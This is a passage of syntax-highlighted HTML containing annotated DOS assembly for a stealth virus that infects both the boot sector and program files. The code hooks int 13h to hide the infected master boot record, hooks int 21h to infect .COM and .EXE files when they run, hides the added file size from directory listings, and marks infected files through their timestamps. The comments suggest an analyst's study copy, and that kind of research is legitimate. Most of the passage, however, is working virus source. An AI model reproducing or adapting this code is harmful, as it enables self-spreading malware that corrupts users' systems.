    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                               </span><span class="sc1">;really a ax/1024</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">;es=segment of _non-existing_</span><span class="sc0">
                                                </span><span class="sc1">;memory (memory allocated for</span><span class="sc0">
                                    </span><span class="sc1">;virus-code)</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                               </span><span class="sc1">;zero dh</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                              </span><span class="sc1">;check if it's hdd0, (dl=80h)</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">mbr_start</span><span class="sc0">                            </span><span class="sc1">;then it is a mbr start</span><span class="sc0">


</span><span class="sc5">floppy_start</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;This code seems to be</span><span class="sc0">
                                                </span><span class="sc1">;pretty unfinished. I wonder</span><span class="sc0">
                                                </span><span class="sc1">;how floppies are being taken</span><span class="sc0">
                                                </span><span class="sc1">;care off.</span><span class="sc0">
</span><span class="sc5">mbr_start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc5">vsect</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                                 </span><span class="sc1">;save drive</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">                                 </span><span class="sc1">;read vsect number of sectors</span><span class="sc0">
                                                </span><span class="sc1">;with start at sector 3 of</span><span class="sc0">
                                                </span><span class="sc1">;hd into vir_seg (es)</span><span class="sc0">


    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                 </span><span class="sc1">;ds=0</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;get int 13h's vector</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">o13</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">o13</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">   </span><span class="sc1">;save int 13h's vector</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],(</span><span class="sc5">i13</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">        </span><span class="sc1">;set int 13h to point to es:i13</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                 </span><span class="sc1">;ds=0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc5">load_mbr_bs</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">                                    </span><span class="sc1">;jmp to es:dx, our vir_seg</span><span class="sc0">
                                                </span><span class="sc1">;and our code to load</span><span class="sc0">
                                                </span><span class="sc1">;the real mbr/bs</span><span class="sc0">
</span><span class="sc5">mbr_bs_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">mbr_bs_code</span><span class="sc0">                     </span><span class="sc1">;size of mbr/bs code -2</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">bs_marker</span><span class="sc0">


</span><span class="sc5">load_mbr_bs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                  </span><span class="sc1">;es=0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                             </span><span class="sc1">;read sector 2 to</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">                            </span><span class="sc1">;es:bx = 0000:7c00h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">;sector # = 2 (saved_code)</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                                  </span><span class="sc1">;dx=80h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">                                 </span><span class="sc1">;load the real mbr/bs from</span><span class="sc0">
                                                </span><span class="sc1">;sector 2 where we stored it</span><span class="sc0">
                                                </span><span class="sc1">;(see proc infect_mbr)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">                                    </span><span class="sc1">;jmp to 0:7c00h and execute the</span><span class="sc0">
                                                </span><span class="sc1">;real bs/mbr</span><span class="sc0">


</span><span class="sc5">i13</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">                                     </span><span class="sc1">;changed to a stc when int 21h</span><span class="sc0">
                                                </span><span class="sc1">;is hooked</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">got_i21</span><span class="sc0">                              </span><span class="sc1">;if we have int21h, don't check</span><span class="sc0">
                                                </span><span class="sc1">;for exe files being exec'd</span><span class="sc0">
                                            </span><span class="sc1">;(int21h not yet set)</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">                        </span><span class="sc1">;check for first EXE file to be</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">got_i21</span><span class="sc0">                             </span><span class="sc1">;loaded</span><span class="sc0">

</span><span class="sc5">hook_i21</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;hook interrupt 21h from</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;the bs/mbr code</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; ds = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">o21</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">o21</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],(</span><span class="sc5">i21</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i13</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc2">0f9h</span><span class="sc0">   </span><span class="sc1">;puts a stc at i13</span><span class="sc0">
                                                </span><span class="sc1">;(so we recognize it's hooked!)</span><span class="sc0">

</span><span class="sc5">got_i21</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">res_check</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">resid</span><span class="sc0">                            </span><span class="sc1">;instalation check cmp ax,5234h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check_stealth_bs_mbr</span><span class="sc0">                </span><span class="sc1">;not equal check next function</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">resid</span><span class="sc0">                            </span><span class="sc1">;ax = res_chk check check</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check_stealth_bs_mbr</span><span class="sc0">                </span><span class="sc1">;bx for same value</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">resid</span><span class="sc0">                            </span><span class="sc1">;if ax &amp; bx = 5234h, load</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">                        </span><span class="sc1">;cx with it, too and return</span><span class="sc0">

</span><span class="sc5">check_stealth_bs_mbr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">;check ANY int13h function</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">org13</span><span class="sc0">                               </span><span class="sc1">;for "track 0, sector 1" (or so)</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">;check for sector-read w/int13h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">stealth_mbr_floppy</span><span class="sc0">                   </span><span class="sc1">;sector_read on sec#1 = stealth!</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                                </span><span class="sc1">;write to sec#1 ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">stealth_mbr_floppy</span><span class="sc0">                   </span><span class="sc1">;redirect that, too.</span><span class="sc0">

</span><span class="sc5">org13</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">                                 </span><span class="sc1">;jmp far ptr ORG13h</span><span class="sc0">
</span><span class="sc5">o13</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;segment:offset adress</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;if we call org13h, return</span><span class="sc0">
                                                </span><span class="sc1">;to proper adress...</span><span class="sc0">

</span><span class="sc5">stealth_mbr_floppy</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">org13</span><span class="sc0">                                </span><span class="sc1">;it's not drive C: = bail</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">floppy_stealth</span><span class="sc0">                       </span><span class="sc1">;(floppy stealth is not yet</span><span class="sc0">
                                            </span><span class="sc1">;implemented, it seems)</span><span class="sc0">
</span><span class="sc5">mbr_stealth</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                  </span><span class="sc1">;redirect read/write to sector2</span><span class="sc0">
                                                </span><span class="sc1">;where the orig_mbr is stored</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">org13</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                  </span><span class="sc1">;CX = not altered</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">;return</span><span class="sc0">

</span><span class="sc5">floppy_stealth</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">org13</span><span class="sc0">



</span><span class="sc1">;===============================================================================</span><span class="sc0">
</span><span class="sc1">; INTERRUPT 21H HANDLER</span><span class="sc0">
</span><span class="sc1">; ---------------------</span><span class="sc0">
</span><span class="sc1">; ax = 5234h = Used for resident-call via int21h</span><span class="sc0">
</span><span class="sc1">; ah = 4bh   = Execute, infect.</span><span class="sc0">
</span><span class="sc1">; ah = 11h   = Find first file via FCB. Decrease file_size increases</span><span class="sc0">
</span><span class="sc1">; ah = 12h   = Find next file via FCB.. Decrease file_size increases</span><span class="sc0">
</span><span class="sc1">; ah = 4eh   = Find first file via file handle. Decrease size increases</span><span class="sc0">
</span><span class="sc1">; ah = 4fh   = Find next file via file handle.. Decrease size increases</span><span class="sc0">
</span><span class="sc1">;===============================================================================</span><span class="sc0">

</span><span class="sc5">i21</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">resid</span><span class="sc0">                            </span><span class="sc1">;if ax = 5234h, return</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_4b</span><span class="sc0">                                 </span><span class="sc1">;that value to bx, too</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">resid</span><span class="sc0">                            </span><span class="sc1">;and return.</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">_4b</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">                            </span><span class="sc1">;infect on file_execute</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">
</span><span class="sc5">_11</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">                              </span><span class="sc1">;file stealth</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_12</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Stealth_FCB</span><span class="sc0">
</span><span class="sc5">_12</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">                              </span><span class="sc1">;file stealth</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_4e</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Stealth_FCB</span><span class="sc0">
</span><span class="sc5">_4e</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                              </span><span class="sc1">;file stealth</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_4f</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Stealth_Handle</span><span class="sc0">
</span><span class="sc5">_4f</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                              </span><span class="sc1">;file stealth</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">org21</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Stealth_Handle</span><span class="sc0">

</span><span class="sc5">org21</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">                                 </span><span class="sc1">;jmp far ptr</span><span class="sc0">
</span><span class="sc5">o21</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;segment:offset to saved int21h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;in case of a call, return.</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">            </span><span class="sc1">;save register in use</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'RI'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">go_on1</span><span class="sc0">                              </span><span class="sc1">;alter this to a "je go_on1" to</span><span class="sc0">
                                                </span><span class="sc1">;test this w/o infecting</span><span class="sc0">
                                                </span><span class="sc1">;files!</span><span class="sc0">

</span><span class="sc5">no_open_jmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_open</span><span class="sc0">

</span><span class="sc5">go_on1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d82h</span><span class="sc0">                            </span><span class="sc1">;open file in read/write mode</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_open_jmp</span><span class="sc0">                          </span><span class="sc1">;error open =&gt; bail</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                              </span><span class="sc1">;place filehandle in BX</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                               </span><span class="sc1">;es=ds=cs</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                            </span><span class="sc1">;get file's date/time stuff</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc5">century</span><span class="sc0">                          </span><span class="sc1">;if it century marked,</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">read_first</span><span class="sc0">                           </span><span class="sc1">;assume infection by us, else</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_td</span><span class="sc0">                          </span><span class="sc1">;bail..</span><span class="sc0">

</span><span class="sc5">read_first</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                              </span><span class="sc1">;save date/time stamp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                              </span><span class="sc1">;read first 18h bytes of</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc5">exeheader</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;file to a buffer called</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                              </span><span class="sc1">;"exeheader" in this source.</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                            </span><span class="sc1">;seek EOF and get filesize</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                               </span><span class="sc1">;returned in dx/ax</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;check for "valid" file-sizes</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">large_enough</span><span class="sc0">                         </span><span class="sc1">;ie. not too big/small.</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">large_enough</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                               </span><span class="sc1">;restore time/date</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_td</span><span class="sc0">

</span><span class="sc5">large_enough</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exeheader</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0"> </span><span class="sc1">;is it an exefile ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infect_EXE</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exeheader</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc12">'MZ'</span><span class="sc0"> </span><span class="sc1">;is it an exefile ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infect_EXE</span><span class="sc0">

</span><span class="sc5">Infect_COM</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;since we ONLY infect on</span><span class="sc0">
                                                </span><span class="sc1">;execute, if a program is</span><span class="sc0">
                                                </span><span class="sc1">;executed by DOS and not</span><span class="sc0">
                                                </span><span class="sc1">;exe, assume .COM!</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">infection_type</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;mark com-infect=on</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                                </span><span class="sc1">;ax=fsize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">new_com</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;store jmp to v-code</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc5">new_com</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">EXE_continue</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;exe_infection will reach</span><span class="sc0">
                                                </span><span class="sc1">;this entry later</span><span class="sc0">
</span><span class="sc5">write_virus</span><span class="sc4">:</span><span class="sc0">
